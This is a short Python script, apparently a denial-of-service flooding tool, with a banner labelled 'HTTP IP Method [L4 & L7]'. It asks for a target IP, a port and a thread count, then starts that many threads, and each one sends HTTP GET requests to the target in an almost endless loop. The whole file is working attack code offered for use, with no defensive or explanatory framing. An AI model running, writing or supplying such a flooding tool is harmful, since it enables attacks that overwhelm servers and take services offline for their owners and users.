# -*- coding: utf-8 -*-
import urllib3
import threading
import os
os.system('cls||clear')

inf=1000000000000

http = urllib3.PoolManager()

print('''
╦ ╦╔╦╗╔╦╗╔═╗  ╦╔═╗  ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗
╠═╣ ║  ║ ╠═╝  ║╠═╝  ║║║║╣  ║ ╠═╣║ ║ ║║
╩ ╩ ╩  ╩ ╩    ╩╩    ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝
-- Target IP must accept HTTP requests -- [get]
						  [L4 & L7]
''')
print("dont add http://")
print(" ")

target = input("Target: ")
port = input("Port: ")
threadcount = input("Threads: ")

target = "http://"+target+":"+port

def httpget():
	for i in range(1, inf):
		try:
			http.request('GET', target)
		except Exception as e:
				print(e)

def threader():
		global threads
		threads=[]
		for i in range(int(threadcount)):
				t=threading.Thread(target=httpget)
				threads.append(t)
				t.start()
threader()
